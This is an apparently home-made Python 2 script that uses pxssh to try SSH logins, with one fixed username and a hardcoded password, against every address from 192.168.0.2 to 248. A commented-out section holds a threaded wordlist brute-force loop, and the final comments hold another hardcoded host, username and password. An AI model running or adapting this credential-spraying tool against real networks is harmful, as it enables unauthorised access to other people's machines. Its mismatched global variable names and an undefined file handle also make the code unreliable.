import pxssh
import time
from threading import *
import sys

maxconn = 2

connection_lock = BoundedSemaphore (value=maxconn)

found = False
fails = 0


def send_command(s, cmd):
	s.sendline(cmd)
	s.prompt()
	print s.before


def connect(host, user, password,release):
  global Found
  global Fails 
  try:
      s=pxssh.pxssh()
      s.login(host, user, password,release)
      #print '[+] Password found : '+ password
      found = True
      print "found ! " + str(host)

  except Exception, e:
     if 'read_nonblocking' in str(e):
       Fails += 1
       #time.sleep(5)
       #connect(host, user, password, False)
     elif 'synchronize with original prompt' in str(e):
       #time.sleep(1)
       pass
       #connect(host, user, password, False) 





passwwd = "}L'{5KLj[QcmyJR,kj2Z2@xh"
i=2
while i<249:
  host = "192.168.0."+str(i)
  if found:
	print "[*] exit : password found"
        exit(0)
  connect(host,"efficientpro",passwwd,True)
  print i
  i+=1

'''
for line in fn.readlines():
  if found:
	print "[*] exit : password found"
  	exit(0)
  if fails>5:
	print "[!] exit : too many socket Timeouts"
	exit(0)
  connection_lock.acquire()
  password = line.strip('\r').strip('\n')
  print "[>] Testing : "+str(password)
  t = Thread(target=connect, args=(host,user,password,True))
  child = t.start()
'''
	
#s=connect('192.168.0.114', 'cds4', 'EP321*+sAV5!$%cds2300^')
#send_command(s, 'ls')
